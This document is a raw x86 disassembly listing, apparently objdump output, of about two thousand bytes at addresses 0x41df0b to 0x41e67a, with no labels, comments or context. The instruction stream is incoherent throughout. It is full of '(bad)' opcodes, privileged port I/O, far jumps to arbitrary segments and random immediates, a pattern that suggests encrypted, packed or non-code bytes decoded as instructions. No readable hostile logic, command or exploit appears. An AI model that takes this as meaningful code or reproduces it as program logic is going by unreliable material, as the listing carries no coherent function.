  41df0b:	cld    
  41df0c:	sbb    al,0x2b
  41df0e:	push   ds
  41df0f:	push   esp
  41df10:	bound  ecx,QWORD PTR [esi+0xb]
  41df13:	in     eax,0xb2
  41df15:	or     BYTE PTR [ebp-0x2c75cf7d],ch
  41df1b:	aas    
  41df1c:	les    ebx,FWORD PTR [ebp-0x72]
  41df1f:	xchg   ebx,eax
  41df20:	loopne 0x41dea5
  41df22:	retf   0x3256
  41df25:	sub    al,0xcf
  41df27:	mov    edi,0x731bb502
  41df2c:	and    esp,DWORD PTR [ebx]
  41df2e:	push   0xfffffff9
  41df30:	stc    
  41df31:	cmp    eax,0x98d012b7
  41df36:	stos   DWORD PTR es:[edi],eax
  41df37:	jmp    0xf1ef9888
  41df3c:	fcom   DWORD PTR [edi+0x6c]
  41df3f:	shl    cl,cl
  41df41:	mov    al,ds:0xdbf7f53
  41df46:	pop    ecx
  41df47:	xor    al,0xb1
  41df49:	adc    DWORD PTR [ebp+0x5717f48],0x5d
  41df50:	ret    
  41df51:	stos   BYTE PTR es:[edi],al
  41df52:	sub    al,0xeb
  41df54:	mul    DWORD PTR [edx+0x23]
  41df57:	inc    ecx
  41df58:	sti    
  41df59:	test   al,0xfb
  41df5b:	xchg   DWORD PTR [eax],edi
  41df5d:	mov    dl,0x16
  41df5f:	loope  0x41dee9
  41df61:	and    DWORD PTR [esi+0x22],eax
  41df64:	aam    0xfe
  41df66:	into   
  41df67:	push   cs
  41df68:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df6a:	sbb    al,0xe2
  41df6c:	add    ah,bh
  41df6e:	sub    ebp,DWORD PTR [edx]
  41df70:	lock ds cdq 
  41df73:	add    dl,BYTE PTR [edx*8+0x116a804d]
  41df7a:	add    cl,ch
  41df7c:	mov    ch,0x91
  41df7e:	stc    
  41df7f:	dec    ebp
  41df80:	fs push esi
  41df82:	jno    0x41dfe0
  41df84:	mov    eax,0x6b3b3455
  41df89:	sbb    ecx,edx
  41df8b:	sub    edx,DWORD PTR [ebx-0x61f6992d]
  41df91:	rcl    eax,1
  41df93:	add    ah,BYTE PTR [ecx-0x1b]
  41df96:	push   DWORD PTR [edi]
  41df98:	fisttp DWORD PTR [eax+0x1337811]
  41df9e:	inc    ebx
  41df9f:	sbb    al,0x99
  41dfa1:	call   0x57a39930
  41dfa6:	and    DWORD PTR [edx+0x5f],0xffffffc4
  41dfaa:	call   0x6a840213
  41dfaf:	adc    DWORD PTR ds:0x5f34b094,ebx
  41dfb5:	and    ebp,DWORD PTR [ebx-0x37072411]
  41dfbb:	jb     0x41e022
  41dfbd:	(bad)  
  41dfbe:	cli    
  41dfbf:	and    DWORD PTR [eax+0x5651ffd0],eax
  41dfc5:	push   cs
  41dfc6:	mov    ecx,0x4bc1ab52
  41dfcb:	ror    DWORD PTR [edi],1
  41dfcd:	or     eax,ebx
  41dfcf:	mov    edx,0xf642948e
  41dfd4:	mov    esp,DWORD PTR [eax-0x1b]
  41dfd7:	js     0x41e040
  41dfd9:	jg     0x41e011
  41dfdb:	mov    bl,0xef
  41dfdd:	rcl    BYTE PTR [edx],cl
  41dfdf:	sar    DWORD PTR [ebp+0x7e],cl
  41dfe2:	mov    cl,0x38
  41dfe4:	in     al,dx
  41dfe5:	aas    
  41dfe6:	int    0xfc
  41dfe8:	mov    BYTE PTR [esi+0x5a330ca4],bl
  41dfee:	enter  0x924,0x99
  41dff2:	addr16 aad 0x62
  41dff5:	je     0x41df7f
  41dff7:	sub    DWORD PTR [ecx+ebp*2],ebx
  41dffa:	loope  0x41e039
  41dffc:	loope  0x41df92
  41dffe:	dec    eax
  41dfff:	nop
  41e000:	scas   al,BYTE PTR es:[edi]
  41e001:	or     al,0xdf
  41e003:	iret   
  41e004:	fwait
  41e005:	jle    0x41e01f
  41e007:	xchg   esp,eax
  41e008:	push   0x3d
  41e00a:	hlt    
  41e00b:	mov    cl,0x3b
  41e00d:	mov    ds,WORD PTR [di]
  41e010:	push   cs
  41e011:	add    bl,0xa7
  41e014:	imul   esp,DWORD PTR [ebx+eax*2],0x31
  41e018:	out    0xc9,eax
  41e01a:	mov    al,ds:0xd3dfffa
  41e01f:	inc    eax
  41e020:	sub    eax,0xb58cb254
  41e025:	popa   
  41e026:	ja     0x41e05b
  41e028:	test   al,0x6f
  41e02a:	sub    eax,0x6d7ddbfc
  41e02f:	dec    ecx
  41e030:	aam    0x8e
  41e032:	xchg   esp,eax
  41e033:	push   0xfffffff2
  41e035:	sbb    eax,0x8ee3f35b
  41e03a:	out    dx,al
  41e03b:	sub    dl,BYTE PTR [ebp+0x55]
  41e03e:	mov    dh,0x13
  41e040:	test   al,0x21
  41e043:	jae    0x41e077
  41e045:	mov    edi,edi
  41e047:	outs   dx,DWORD PTR ds:[esi]
  41e048:	stos   BYTE PTR es:[edi],al
  41e049:	push   ecx
  41e04a:	pop    esi
  41e04b:	mov    edx,0x9880ad1c
  41e050:	xlat   BYTE PTR ds:[ebx]
  41e051:	xor    esp,DWORD PTR [esi+0x2c]
  41e054:	xchg   ebx,eax
  41e055:	fstp   TBYTE PTR [edx+0x4ace5b64]
  41e05b:	adc    al,bh
  41e05d:	test   eax,0x3ac5865f
  41e062:	ins    BYTE PTR es:[edi],dx
  41e063:	inc    edx
  41e064:	out    dx,al
  41e065:	lods   al,BYTE PTR ds:[esi]
  41e066:	and    al,0x41
  41e068:	ja     0x41e06a
  41e06a:	jbe    0x41e075
  41e06c:	jmp    0x7d56:0x857d5c13
  41e073:	and    BYTE PTR [esi],0xe0
  41e076:	pop    edx
  41e077:	xor    ebx,0x28
  41e07a:	fild   WORD PTR ds:0x7cfc2e83
  41e080:	popf   
  41e081:	sbb    al,dh
  41e083:	push   ds
  41e084:	pop    ebp
  41e085:	adc    dh,BYTE PTR [ebx+0x2e]
  41e088:	lock mov ch,0xe5
  41e08b:	neg    BYTE PTR [edx-0x41]
  41e08e:	add    esp,ebx
  41e090:	jecxz  0x41e093
  41e092:	xor    BYTE PTR [edx+0x5e],bl
  41e095:	pop    edx
  41e096:	dec    eax
  41e097:	cmp    esi,DWORD PTR [edx+0x41]
  41e09a:	test   DWORD PTR [esi+0x54],0xd411f266
  41e0a1:	sbb    BYTE PTR [ebp+0x49],ah
  41e0a4:	clc    
  41e0a5:	jmp    0xaeda:0xd7858551
  41e0ac:	pop    ss
  41e0ad:	dec    edx
  41e0ae:	int3   
  41e0af:	sti    
  41e0b0:	push   cs
  41e0b1:	or     BYTE PTR [ecx+0x44],ch
  41e0b4:	mov    ss:0x67b2a8d3,al
  41e0ba:	sbb    eax,0x832706b
  41e0bf:	out    dx,al
  41e0c0:	ja     0x41e125
  41e0c2:	inc    eax
  41e0c3:	and    al,0xd5
  41e0c5:	dec    ebx
  41e0c6:	scas   eax,DWORD PTR es:[edi]
  41e0c7:	and    ecx,DWORD PTR [edi]
  41e0c9:	retf   0x917e
  41e0cc:	retf   
  41e0cd:	jns    0x41e0aa
  41e0cf:	xor    eax,0x39067a2a
  41e0d4:	push   esp
  41e0d5:	in     al,0x69
  41e0d7:	jns    0x41e0d5
  41e0d9:	add    BYTE PTR [ebx],bl
  41e0db:	std    
  41e0dc:	xchg   BYTE PTR ds:0x7d185513,bh
  41e0e2:	pop    ds
  41e0e3:	jmp    0x41e0c2
  41e0e5:	sbb    ah,BYTE PTR [esi]
  41e0e7:	test   DWORD PTR [ecx],ebx
  41e0e9:	and    eax,0x5324c8b4
  41e0ee:	sub    dl,cl
  41e0f0:	and    ch,al
  41e0f2:	mov    al,ds:0x977ac7d0
  41e0f7:	dec    edx
  41e0f8:	xlat   BYTE PTR ds:[ebx]
  41e0f9:	mov    DWORD PTR [eax+0x159eb188],edx
  41e0ff:	dec    esi
  41e100:	repz scas al,BYTE PTR es:[edi]
  41e102:	test   al,0x11
  41e104:	jno    0x41e15d
  41e106:	fnstcw WORD PTR ds:0xcb07330a
  41e10c:	push   cs
  41e10d:	xor    eax,0xaf9d2e06
  41e112:	stos   BYTE PTR es:[edi],al
  41e113:	mov    cl,0x65
  41e115:	sar    DWORD PTR ds:0x30f88c53,1
  41e11b:	xor    cl,BYTE PTR [edx+0x70]
  41e11e:	popf   
  41e11f:	xor    BYTE PTR [ebx-0x43416ce2],cl
  41e125:	and    ah,cl
  41e127:	fimul  DWORD PTR [edx-0x5e64b830]
  41e12d:	dec    esp
  41e12e:	pushf  
  41e12f:	jae    0x41e11d
  41e131:	xchg   ebx,eax
  41e132:	fs push esp
  41e134:	test   ebx,0x39c48cc6
  41e13a:	mov    bh,0xcd
  41e13c:	pminsw mm5,QWORD PTR [ecx]
  41e13f:	cmp    edx,DWORD PTR [ebx-0x2889e8fc]
  41e145:	sub    DWORD PTR [edx+0x41],0xa7178967
  41e14c:	popa   
  41e14d:	lea    esi,[esi+ebp*4-0x25]
  41e151:	dec    edi
  41e152:	call   0x387c:0x8a0d85cf
  41e159:	add    cl,al
  41e15b:	xchg   ebx,eax
  41e15c:	or     dl,BYTE PTR [edx+0x17]
  41e15f:	sub    DWORD PTR [esp+edi*4+0x35c4d7a],esi
  41e166:	std    
  41e167:	jnp    0x41e136
  41e169:	stos   DWORD PTR es:[edi],eax
  41e16a:	sub    DWORD PTR [esi],ebp
  41e16c:	inc    ebx
  41e16d:	and    BYTE PTR [ecx+edi*8+0x1],0xf5
  41e172:	or     ecx,edx
  41e174:	cs adc al,0xb6
  41e177:	lds    ebx,FWORD PTR [edi-0x3bdfae02]
  41e17d:	test   al,0x79
  41e17f:	pop    eax
  41e180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e181:	cmp    ebp,DWORD PTR [edx+0x3a]
  41e184:	mov    BYTE PTR [edx-0x59],ch
  41e187:	sbb    eax,0x739779bd
  41e18c:	fdivr  DWORD PTR [edx]
  41e18e:	xchg   esp,eax
  41e190:	in     al,0x1f
  41e192:	adc    al,0x18
  41e194:	sti    
  41e195:	mov    ?,WORD PTR [ebp+0x6b]
  41e198:	jg     0x41e1af
  41e19a:	jle    0x41e219
  41e19c:	rol    DWORD PTR [esi],1
  41e19e:	push   0x78fbce7f
  41e1a3:	bound  ebp,QWORD PTR [edi+0x7f]
  41e1a6:	mov    eax,0x2b9e41f4
  41e1ab:	mov    bl,0xc0
  41e1ad:	cmc    
  41e1ae:	jge    0x41e13d
  41e1b0:	sahf   
  41e1b1:	push   ss
  41e1b2:	and    ebx,edx
  41e1b4:	push   ss
  41e1b5:	icebp  
  41e1b6:	push   edx
  41e1b7:	(bad)  
  41e1b8:	aam    0x32
  41e1ba:	in     eax,0x38
  41e1bc:	(bad)  
  41e1bd:	shl    DWORD PTR es:[edi+ecx*1],0x74
  41e1c2:	out    0x75,eax
  41e1c4:	dec    ecx
  41e1c5:	icebp  
  41e1c6:	mov    ah,0x9c
  41e1c8:	test   eax,0xfa3d9d26
  41e1cd:	sub    DWORD PTR [edi],esi
  41e1cf:	mov    fs,WORD PTR [edi+0xa4ff206]
  41e1d5:	addr16 clc 
  41e1d7:	aas    
  41e1d8:	mov    esi,0x74be928b
  41e1dd:	es inc edx
  41e1df:	pop    ecx
  41e1e0:	hlt    
  41e1e1:	sub    ecx,DWORD PTR [ebp+0x6a]
  41e1e4:	leave  
  41e1e5:	cld    
  41e1e6:	imul   ecx,DWORD PTR [ebp-0x15263346],0xffffffec
  41e1ed:	bound  ecx,QWORD PTR [esi-0x112fe385]
  41e1f3:	sar    BYTE PTR [edx+0x35],cl
  41e1f6:	jle    0x41e17f
  41e1f8:	xchg   edx,eax
  41e1f9:	std    
  41e1fa:	pop    eax
  41e1fb:	popa   
  41e1fc:	xor    eax,0xcc41f33b
  41e201:	add    dl,al
  41e203:	pushf  
  41e204:	outs   dx,BYTE PTR ds:[esi]
  41e205:	int    0xc7
  41e207:	pop    ebp
  41e208:	pop    edi
  41e209:	into   
  41e20a:	xchg   esp,eax
  41e20b:	and    al,BYTE PTR [ebp+0x4c5f9501]
  41e211:	mov    ch,0x46
  41e213:	imul   edi,DWORD PTR [ebx+0x38],0x4c
  41e217:	nop
  41e218:	ins    DWORD PTR es:[edi],dx
  41e219:	push   es
  41e21a:	test   eax,0xd14d7999
  41e21f:	sub    al,0xd6
  41e221:	ins    DWORD PTR es:[edi],dx
  41e222:	push   cs
  41e223:	adc    BYTE PTR [edx+0x59],ch
  41e226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e227:	mov    bl,BYTE PTR [ecx-0x77ab9570]
  41e22d:	jp     0x41e251
  41e22f:	pusha  
  41e230:	lock sbb dl,BYTE PTR [edx-0x9]
  41e234:	dec    ebx
  41e235:	ror    DWORD PTR [edx],0x2f
  41e238:	cs movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e23b:	xor    BYTE PTR [ebx+0xa97f8fe],0x80
  41e242:	xchg   esi,eax
  41e243:	call   0xb754401
  41e248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e249:	mov    eax,0xb1be424c
  41e24e:	into   
  41e24f:	pop    ss
  41e250:	pop    ebx
  41e251:	scas   al,BYTE PTR es:[edi]
  41e252:	xor    BYTE PTR [eax-0x49],al
  41e255:	cli    
  41e256:	mov    ebx,edi
  41e258:	pop    edx
  41e259:	sub    eax,0x1d130ea4
  41e25e:	cmp    BYTE PTR [ebx+0x49],cl
  41e261:	dec    esp
  41e262:	and    DWORD PTR [ecx],0xd3a24bd6
  41e268:	adc    dh,bl
  41e26a:	ja     0x41e223
  41e26c:	push   ebx
  41e26d:	add    edx,DWORD PTR [ecx+0xd7ab32f]
  41e273:	std    
  41e274:	pop    es
  41e275:	pop    ds
  41e276:	xchg   edx,eax
  41e277:	ret    
  41e278:	pushf  
  41e279:	jge    0x41e24e
  41e27b:	push   edx
  41e27c:	or     cl,bl
  41e27e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e27f:	xchg   BYTE PTR [edi+0x5bb3453b],bl
  41e285:	add    DWORD PTR ds:0x5de42b32,ebp
  41e28b:	sbb    edx,ebx
  41e28d:	xor    al,0x50
  41e290:	fs icebp 
  41e292:	mov    eax,ds:0xdf37d551
  41e297:	repz pop edx
  41e299:	mov    esp,0x32a1557e
  41e29e:	xchg   edx,eax
  41e29f:	and    ecx,ebx
  41e2a1:	jmp    0x8b1f:0x72c0fd75
  41e2a8:	mov    ah,0xb3
  41e2aa:	fidivr DWORD PTR [ebp+0x78]
  41e2ad:	dec    esi
  41e2ae:	and    BYTE PTR [edx-0x7f1ee73a],dh
  41e2b4:	push   0x7c521f38
  41e2b9:	out    dx,eax
  41e2ba:	stc    
  41e2bb:	or     esp,DWORD PTR [ebp-0x31]
  41e2be:	in     al,dx
  41e2bf:	mov    eax,0x4e902f87
  41e2c4:	pop    es
  41e2c5:	cdq    
  41e2c6:	xor    DWORD PTR [esp+edi*8+0x1],ebx
  41e2ca:	dec    edi
  41e2cb:	gs into 
  41e2cd:	cs jmp 0x41e313
  41e2d0:	pop    esp
  41e2d1:	not    BYTE PTR [esp+ebp*2-0x35e8fbb2]
  41e2d8:	add    al,0xc
  41e2da:	arpl   WORD PTR [ebx+0x71fad1b3],bx
  41e2e0:	in     al,0x81
  41e2e2:	aam    0x65
  41e2e4:	mov    ds,WORD PTR [eax+0x53d30cfd]
  41e2ea:	repnz std 
  41e2ec:	stos   DWORD PTR es:[edi],eax
  41e2ed:	add    dl,BYTE PTR [edi-0x23936936]
  41e2f3:	mov    esp,0x3139ecd8
  41e2f8:	and    edi,DWORD PTR [esi+0x7f]
  41e2fb:	outs   dx,BYTE PTR ds:[esi]
  41e2fc:	inc    ebp
  41e2fd:	idiv   BYTE PTR [edi+0x65]
  41e300:	es mov dl,0xd7
  41e303:	mov    al,0x68
  41e305:	add    eax,0x9e9f14a0
  41e30a:	pop    edi
  41e30b:	mov    ds:0xc285a5ae,al
  41e310:	cdq    
  41e311:	adc    BYTE PTR [edi],dl
  41e313:	out    0x5e,al
  41e315:	fwait
  41e316:	(bad)
  41e319:	mov    al,0x32
  41e31b:	cli    
  41e31c:	outs   dx,DWORD PTR ds:[esi]
  41e31d:	pop    esp
  41e31e:	pand   mm1,QWORD PTR [ecx]
  41e321:	jb     0x41e318
  41e323:	pop    ds
  41e324:	cmp    BYTE PTR [esi-0xb],ah
  41e327:	inc    ebx
  41e328:	mov    bh,0xa8
  41e32a:	jno    0x41e2be
  41e32c:	jl     0x41e368
  41e32e:	adc    BYTE PTR [edi-0x7a],dh
  41e331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e332:	or     dh,ch
  41e334:	mov    ecx,0xfe4e1f29
  41e339:	dec    edi
  41e33a:	hlt    
  41e33b:	pop    esp
  41e33c:	cs ds sub al,0x61
  41e340:	pop    ax
  41e342:	hlt    
  41e343:	xchg   BYTE PTR [edi],dl
  41e345:	inc    esp
  41e346:	hlt    
  41e347:	retf   
  41e348:	ret    0xa447
  41e34b:	inc    ebx
  41e34c:	test   eax,0xe92baaaa
  41e351:	push   ss
  41e352:	jo     0x41e326
  41e354:	je     0x41e2ea
  41e356:	nop
  41e357:	sbb    ecx,DWORD PTR [eax-0x2a]
  41e35a:	pop    es
  41e35b:	mov    cl,0xbc
  41e35d:	fist   WORD PTR [eax]
  41e35f:	out    dx,al
  41e360:	loope  0x41e343
  41e362:	cli    
  41e363:	mov    ah,0x9
  41e365:	out    dx,eax
  41e366:	cdq    
  41e367:	push   edx
  41e368:	add    dl,BYTE PTR [esp+eax*1+0x2]
  41e36c:	daa    
  41e36d:	dec    ebp
  41e36e:	shl    DWORD PTR [edx+0x24b711f2],cl
  41e374:	fwait
  41e375:	lods   al,BYTE PTR ds:[esi]
  41e376:	cwde   
  41e377:	mov    cl,BYTE PTR [esi+0x54]
  41e37a:	stos   DWORD PTR es:[edi],eax
  41e37b:	jae    0x41e3c2
  41e37d:	sub    al,0xac
  41e37f:	cmp    cl,BYTE PTR [edx+0x335a12bf]
  41e385:	int3   
  41e386:	mov    edi,0x47118b7c
  41e38b:	add    eax,0x7b3e82eb
  41e390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e391:	cmc    
  41e392:	aad    0x4f
  41e394:	xchg   BYTE PTR [esi+ebx*1],dl
  41e397:	(bad)  
  41e398:	xchg   esp,eax
  41e399:	jo     0x41e3c1
  41e39b:	mov    edx,0x17bd725
  41e3a0:	test   BYTE PTR [ebp-0x249b53fa],0xe0
  41e3a7:	stos   BYTE PTR es:[edi],al
  41e3a8:	jge    0x41e3f6
  41e3aa:	call   0x544fc403
  41e3af:	and    eax,DWORD PTR [ebx-0x75cd2d6e]
  41e3b5:	cli    
  41e3b6:	and    DWORD PTR [ecx+eax*1-0x49],eax
  41e3ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3bb:	cmp    ah,BYTE PTR [edi+ebx*8]
  41e3be:	pop    ebp
  41e3bf:	mov    esp,0x121a8a5d
  41e3c4:	in     al,0x4b
  41e3c6:	sahf   
  41e3c7:	mov    ds:0x8c4ddde1,al
  41e3cc:	div    BYTE PTR ds:[eax+0x69]
  41e3d0:	ins    DWORD PTR es:[edi],dx
  41e3d1:	dec    ebp
  41e3d2:	(bad)  
  41e3d3:	push   esp
  41e3d4:	stos   BYTE PTR es:[edi],al
  41e3d5:	pop    edx
  41e3d6:	mov    dl,0x5f
  41e3d8:	ja     0x41e35a
  41e3da:	test   DWORD PTR [eax],eax
  41e3dc:	std    
  41e3dd:	jmp    0xac67dfdb
  41e3e2:	sbb    DWORD PTR [esi+0x1deefbf5],edi
  41e3e8:	mov    ebp,DWORD PTR [ebx-0x49f3d57b]
  41e3ee:	cs mov bl,0x21
  41e3f1:	inc    esp
  41e3f2:	nop
  41e3f3:	pop    edi
  41e3f4:	(bad)
  41e3f7:	aaa    
  41e3f8:	loope  0x41e449
  41e3fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3fb:	sub    BYTE PTR [esi],dl
  41e3fd:	outs   dx,DWORD PTR ds:[esi]
  41e3fe:	or     al,0xbf
  41e400:	xchg   DWORD PTR [ecx+edx*2+0xc],esi
  41e404:	xor    BYTE PTR [eax],ch
  41e406:	mov    bh,0xcf
  41e408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e409:	xchg   edx,eax
  41e40a:	cmp    al,0xc6
  41e40c:	adc    BYTE PTR ds:0xd54d50a6,dh
  41e412:	pop    ss
  41e413:	aaa    
  41e414:	push   ds
  41e415:	dec    DWORD PTR [eax+0x7c90a737]
  41e41b:	or     al,0x74
  41e41d:	in     eax,dx
  41e41e:	dec    DWORD PTR [edx]
  41e420:	in     eax,0x84
  41e422:	out    0x44,al
  41e424:	jno    0x41e3a9
  41e426:	shr    BYTE PTR [ecx],cl
  41e428:	push   ecx
  41e429:	add    BYTE PTR [eax+0x3513b988],dl
  41e42f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e430:	mov    bl,0xe3
  41e432:	push   0xffffffa7
  41e434:	adc    DWORD PTR [esi-0x6343ddea],esi
  41e43a:	outs   dx,DWORD PTR ds:[esi]
  41e43b:	stos   DWORD PTR es:[edi],eax
  41e43c:	cmp    esi,DWORD PTR [edi]
  41e43e:	push   edx
  41e43f:	add    eax,DWORD PTR [eax]
  41e441:	imul   ecx,DWORD PTR [esi],0x2855e891
  41e447:	xor    esi,DWORD PTR [ecx-0x590a23fe]
  41e44d:	mov    esp,0x1ff919d
  41e452:	adc    BYTE PTR [ebx+0xd127c92],0x4b
  41e459:	sbb    al,ch
  41e45b:	(bad)  
  41e45c:	fucom  st(7)
  41e45e:	mov    edi,0xc24ebb4a
  41e463:	dec    ebx
  41e464:	in     al,0xe6
  41e466:	lods   al,BYTE PTR ds:[esi]
  41e467:	stos   BYTE PTR es:[edi],al
  41e468:	jmp    0xc2d4:0xee24fc02
  41e46f:	call   0xf6de8c32
  41e474:	xor    cl,BYTE PTR [eax+0x4631360b]
  41e47a:	xchg   esp,eax
  41e47b:	scas   eax,DWORD PTR es:[edi]
  41e47c:	xchg   DWORD PTR [edi+0x34ad0b87],esp
  41e482:	pop    esi
  41e483:	rcr    DWORD PTR [edx],0xb2
  41e486:	mov    dl,0x45
  41e488:	jmp    0x925f:0xe5aba896
  41e48f:	mov    eax,0xc0564a95
  41e494:	add    edi,eax
  41e496:	mov    dh,0x20
  41e498:	jl     0x41e463
  41e49a:	mov    al,0xe2
  41e49c:	and    BYTE PTR [esp+edi*8],dl
  41e49f:	push   esp
  41e4a0:	xchg   edi,eax
  41e4a1:	xor    ecx,esi
  41e4a3:	add    DWORD PTR [edi],esi
  41e4a5:	stos   BYTE PTR es:[edi],al
  41e4a6:	ror    edx,1
  41e4a8:	sar    BYTE PTR ds:0x97c31cf7,0x67
  41e4af:	or     DWORD PTR [esi+0x6e6d021e],eax
  41e4b5:	call   0xcc87945
  41e4ba:	mov    ds:0x7eab2dc5,eax
  41e4bf:	shl    esi,0xb9
  41e4c2:	int3   
  41e4c3:	push   cs
  41e4c4:	enter  0x4bd4,0xd2
  41e4c8:	cmp    BYTE PTR ds:0x81947e1e,dl
  41e4ce:	mov    bh,0xe2
  41e4d0:	popa   
  41e4d1:	mov    dh,0xea
  41e4d3:	sub    bh,BYTE PTR [ebx+0x7fd3fc5]
  41e4d9:	dec    edi
  41e4da:	sbb    eax,0xfa229b71
  41e4df:	(bad)  
  41e4e0:	xchg   edi,eax
  41e4e1:	adc    DWORD PTR [edx-0xed36590],ebp
  41e4e7:	mov    dl,0xb
  41e4e9:	jbe    0x41e50a
  41e4eb:	fwait
  41e4ec:	or     DWORD PTR [edx+0x78],eax
  41e4ef:	sub    BYTE PTR [ebp-0x112a4355],0x81
  41e4f6:	(bad)  
  41e4f7:	daa    
  41e4f8:	int    0x1b
  41e4fa:	shl    BYTE PTR [edx+0x4f],cl
  41e4fd:	xor    edi,DWORD PTR [edi-0x4]
  41e500:	pop    ebx
  41e501:	sbb    BYTE PTR [ebx],al
  41e503:	rcr    BYTE PTR [esi+0x3d],0x3e
  41e507:	jbe    0x41e499
  41e509:	xor    eax,0xffb99a5d
  41e50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e50f:	and    eax,0xf0dedc24
  41e514:	xor    dl,BYTE PTR [eax-0x45]
  41e517:	dec    edx
  41e518:	aas    
  41e519:	mov    esi,DWORD PTR [ecx]
  41e51b:	hlt    
  41e51c:	lea    eax,[bx+di]
  41e51f:	xor    eax,ecx
  41e521:	cmp    al,0x63
  41e523:	rol    DWORD PTR [eax+esi*4],0x10
  41e527:	sbb    eax,0x8fde84c7
  41e52c:	mov    BYTE PTR [esi-0x58],dl
  41e52f:	pop    edx
  41e530:	mov    bh,0xe6
  41e532:	cli    
  41e533:	jbe    0x41e50e
  41e535:	jge    0x41e51b
  41e537:	mov    ch,0x76
  41e539:	lea    ebx,[ebx-0x24]
  41e53c:	into   
  41e53d:	mov    dl,0x53
  41e53f:	ins    DWORD PTR es:[edi],dx
  41e540:	cmp    bl,cl
  41e542:	jl     0x41e4d6
  41e544:	xchg   esi,eax
  41e545:	push   cs
  41e546:	xlat   BYTE PTR ds:[ebx]
  41e547:	std    
  41e548:	outs   dx,DWORD PTR cs:[esi]
  41e54a:	mov    eax,0x34686555
  41e54f:	ret    0x1466
  41e552:	out    dx,al
  41e553:	sahf   
  41e554:	sahf   
  41e555:	outs   dx,BYTE PTR ds:[esi]
  41e556:	fdivr  DWORD PTR [ebx-0x43a0c6e3]
  41e55c:	jns    0x41e54c
  41e55e:	pusha  
  41e55f:	adc    eax,0xca1e42aa
  41e564:	mov    esp,DWORD PTR [edi-0x3d]
  41e567:	imul   eax,DWORD PTR [esi+esi*4-0x25],0xcac94fa0
  41e56f:	mov    al,ds:0x7a24aa7b
  41e574:	(bad)  
  41e575:	fstp   QWORD PTR [edi-0x43]
  41e578:	push   edx
  41e579:	je     0x41e5d9
  41e57b:	iret   
  41e57c:	cmp    bl,bh
  41e57e:	aas    
  41e57f:	mov    edi,0xe6b60ff8
  41e584:	test   ecx,esp
  41e586:	int    0x94
  41e588:	pop    esp
  41e589:	jae    0x41e52c
  41e58b:	sub    ebp,DWORD PTR [ebx+ebp*4-0x19]
  41e58f:	add    eax,0x177e4752
  41e594:	aam    0xf3
  41e596:	repnz mov eax,ds:0x1d7162aa
  41e59c:	ret    0x4b08
  41e59f:	mov    edi,0xd25983ea
  41e5a4:	mov    al,0x6f
  41e5a6:	sub    dh,BYTE PTR [eax]
  41e5a8:	shl    BYTE PTR [ebx+edx*4-0x7832a259],cl
  41e5af:	test   edx,edi
  41e5b1:	int    0x83
  41e5b3:	cli    
  41e5b4:	push   eax
  41e5b5:	std    
  41e5b6:	lea    ebx,gs:[edi+0x1789fbc0]
  41e5bd:	push   es
  41e5be:	jae    0x41e564
  41e5c0:	push   es
  41e5c1:	mov    dh,0x3d
  41e5c3:	pushf  
  41e5c4:	and    edx,DWORD PTR [edx]
  41e5c6:	daa    
  41e5c7:	(bad)
  41e5cc:	sub    ch,bl
  41e5ce:	cmp    edi,DWORD PTR [ecx+0x6d]
  41e5d1:	jmp    0x68e9:0x1d9c8057
  41e5d8:	inc    ebx
  41e5d9:	sub    eax,ebp
  41e5db:	xor    al,0xc4
  41e5dd:	sbb    eax,0x6ad8f86f
  41e5e2:	ret    
  41e5e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5e4:	sub    ecx,ecx
  41e5e6:	retf   
  41e5e7:	scas   eax,DWORD PTR es:[edi]
  41e5e8:	cmp    al,0xc3
  41e5ea:	inc    ebx
  41e5eb:	mov    ebp,DWORD PTR [ecx-0x13]
  41e5ee:	mov    ds:0xd2b4385f,al
  41e5f3:	hlt    
  41e5f4:	ret    0xc00f
  41e5f7:	adc    BYTE PTR [esi-0x57],bl
  41e5fa:	pop    ecx
  41e5fb:	jnp    0x41e5d9
  41e5fd:	add    eax,0xdb9fda31
  41e602:	aam    0xa7
  41e604:	add    ebx,DWORD PTR [ebx-0x1d5115a9]
  41e60a:	jnp    0x41e653
  41e60c:	(bad)  
  41e60d:	and    eax,0xc21bcb09
  41e612:	cli    
  41e613:	daa    
  41e614:	pop    es
  41e615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e616:	retf   
  41e617:	add    bl,BYTE PTR [ebp-0x1b8989d4]
  41e61d:	dec    esp
  41e61e:	mov    fs,WORD PTR [eax+0xfd3f70f]
  41e624:	std    
  41e625:	and    cl,BYTE PTR [edi]
  41e627:	mov    ecx,0x54ea9e2c
  41e62c:	imul   ebp,ebp,0x84285dee
  41e632:	je     0x41e616
  41e634:	xor    BYTE PTR [ecx+0x6b7cfe0e],0x84
  41e63b:	sbb    BYTE PTR [eax-0x12],al
  41e63e:	push   0xfffffffd
  41e640:	xchg   ebx,eax
  41e641:	push   ecx
  41e642:	xor    eax,0x42b5066e
  41e647:	or     bh,BYTE PTR [ecx]
  41e649:	mov    bh,0xf
  41e64b:	fld    st(4)
  41e64d:	jo     0x41e675
  41e64f:	repz push cs
  41e651:	or     al,BYTE PTR [ebp+0x353ef3b4]
  41e657:	test   al,0xac
  41e659:	ins    BYTE PTR es:[edi],dx
  41e65a:	mov    edi,0x9e8d0f2d
  41e65f:	ja     0x41e6ac
  41e661:	sub    ecx,esi
  41e663:	cmp    esp,DWORD PTR [ecx]
  41e665:	pop    ss
  41e666:	dec    esi
  41e667:	dec    ebp
  41e668:	pop    ds
  41e669:	sub    ecx,DWORD PTR [ebp-0x155d4cbc]
  41e66f:	gs push ds
  41e671:	mov    cl,BYTE PTR [ebx]
  41e673:	les    eax,FWORD PTR [esi+0x432cbd77]
  41e679:	inc    ebx
  41e67a:	sbb    eax,0xa90eb47
